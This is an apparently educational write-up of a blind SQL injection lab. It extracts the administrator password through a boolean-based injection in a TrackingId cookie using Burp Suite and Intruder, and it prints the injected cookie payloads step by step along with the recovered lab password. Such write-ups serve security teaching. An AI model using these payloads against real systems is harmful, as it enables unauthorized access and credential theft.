This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a "Welcome back" message in the page if the query returns any rows.

The database contains a different table called users, with columns called username and password. You need to exploit the blind SQL injection vulnerability to find out the password of the administrator user.

To solve the lab, log in as the administrator user.


![image](https://github.com/udayk01/Web-Security/assets/52235763/5de5e333-5dfb-4b8a-a348-460f152ba18e)

> Using Burp Suite to intercept and modify the request containing the TrackingId cookie.

> After which we modify the TrackingId cookie as follows and checks whether the Welcome Back message appears as response 

>> TrackingId=(as it is)' AND '1'='1

![image](https://github.com/udayk01/Web-Security/assets/52235763/59627de4-f093-480c-ba4e-2f361b9a0315)

> After which we modify the TrackingId as follows 

>> TrackingId=(as it is)' AND '1'='2 

> Verifying that the "Welcome back" message does not appear in the response.

![image](https://github.com/udayk01/Web-Security/assets/52235763/033a8af7-2320-4576-8b59-028cd283e40e)

> Now changing it to 

>> TrackingId=(as it is)' AND (SELECT 'a' FROM users LIMIT 1)='a 

> We can Verify that the condition is true, confirming that there is a table called users.

![image](https://github.com/udayk01/Web-Security/assets/52235763/00e63f8b-754c-43b0-8384-bca78ce93828)

>> TrackingId=(as it is)' AND (SELECT 'a' FROM users WHERE username='administrator')='a

> We can verify that the condition is true, confirming that there is a user called administrator.

![image](https://github.com/udayk01/Web-Security/assets/52235763/f7fb94b3-c389-4cd2-9416-6bbf0339b37b)

> To determine how many characters are in the password of the administrator user. To do this, change the value to

>> TrackingId=(as it is)' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a

> This condition should be true, confirming that the password is greater than 1 character in length.

![image](https://github.com/udayk01/Web-Security/assets/52235763/ff59eeb3-90ed-459c-a15b-e2ab8fcf40c2)

> Now change the value to 25

>> TrackingId=(as it is)' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>25)='a

> This condition should be false, confirming that the password is less than 25 character in length.

> So it is clear that password length is under 25 character lengths.

![image](https://github.com/udayk01/Web-Security/assets/52235763/cd3809bd-1d90-4aae-9e22-cb8f7684fa3c)

> Now we start the attack. Send the Get request to Intruder and change the payloads as follows according to our need. 

![image](https://github.com/udayk01/Web-Security/assets/52235763/71ca2878-5445-478e-96c1-7122f904a797)

![image](https://github.com/udayk01/Web-Security/assets/52235763/4e8f0374-7226-40dd-b954-e3c0abcd96e4)

![image](https://github.com/udayk01/Web-Security/assets/52235763/858cff1d-3bf6-4c32-bffe-d8867314abdd)

![image](https://github.com/udayk01/Web-Security/assets/52235763/4c7ebeb4-a9b9-4347-9726-ca2a401abd72)

![image](https://github.com/udayk01/Web-Security/assets/52235763/54c7831e-e41f-461e-a1c7-b2150ddfc7c8)

![image](https://github.com/udayk01/Web-Security/assets/52235763/399aa9f5-4259-46d2-8997-a1487c8d4655)

![image](https://github.com/udayk01/Web-Security/assets/52235763/f99557f3-2027-4516-8fa9-71a8b32525ba)

![image](https://github.com/udayk01/Web-Security/assets/52235763/77282967-da77-4c92-b112-c98a50cf2539)

![image](https://github.com/udayk01/Web-Security/assets/52235763/86fd8b0c-73c7-4f97-92a4-cd9cd708fe3f)

![image](https://github.com/udayk01/Web-Security/assets/52235763/7d70973b-6ad8-4942-a21c-cb8f42696410)

![image](https://github.com/udayk01/Web-Security/assets/52235763/3fe68fe8-82f0-4729-83fb-43941bf06dfb)

![image](https://github.com/udayk01/Web-Security/assets/52235763/e3cc8568-854e-4d64-b21f-33694bac85ab)

> Login with the username administrator and password 0z426qu7ic262y0zdjrm which we retrieved after the attack.

![image](https://github.com/udayk01/Web-Security/assets/52235763/d902a2ae-56d3-4139-942b-ee451887a0e3)











